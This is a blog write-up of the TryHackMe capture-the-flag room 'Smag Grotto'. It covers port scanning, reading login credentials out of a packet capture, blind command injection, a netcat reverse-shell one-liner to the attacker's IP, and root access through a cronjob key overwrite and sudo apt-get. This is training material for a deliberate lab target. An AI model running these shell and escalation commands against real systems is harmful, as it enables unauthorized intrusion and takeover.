---
layout: post
title:  "TryHackMe Smag Grotto writeup"
date:   2020-12-25 12:59:36 +0200
categories: writeup tryhackme
---

This is a writeup for TryHackMe room [Smag Grotto](https://tryhackme.com/room/smaggrotto) where you need to analyze a pcap file to find credentials to admin portal and use blind command injection to land a reverse shell.

## Reconnaissance

Let’s start with a nmap scan:
```
$ nmap -sC -sV  -p- 10.10.0.19   
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-25 15:35 EET
Nmap scan report for 10.10.0.19
Host is up (0.053s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web server enumeration


![Smag]({{ site_url }}/assets/smaggrotto/web.png)

Let's use gobuster to enumerate the server:

```
 gobuster -q -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -u 10.10.0.19 -x php,html,txt dir
/index.php (Status: 200)
/mail (Status: 301)
/server-status (Status: 403)
```

The mail url looks interesting so let's take la look:
![webmail]({{ site_url }}/assets/smaggrotto/webmail.png)


Let's see what's in the packet capture file that we can download:
```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=__REDACTED__HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

There is an username and password. But we also note that the request is made to a specific hostname. Let's add it to our `/etc/hosts` so we can access it.

## Gaining entry

add developmnent.smag.thm to hosts file and go to the login page. Login with the credentials from the pcap.

![command]({{ site_url }}/assets/smaggrotto/command.png)

Blind command injection. Reverse shell from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.24.151 4444 >/tmp/f
```

upgrade shell with Python:

```
python3 -c 'import pty;pty.spawn("/bin/bash")
```

## Privilege escalation

Install [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and enumerate server.

There is a cronjob that copies a file to authorized keys. 
```
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```
Let's copy our own key there and login as jake.


```
sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

Let's find a suitable exploit from [GtfoBins](https://gtfobins.github.io/gtfobins/apt-get/)

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
__REDACTED__
```
BOOM! We are root. 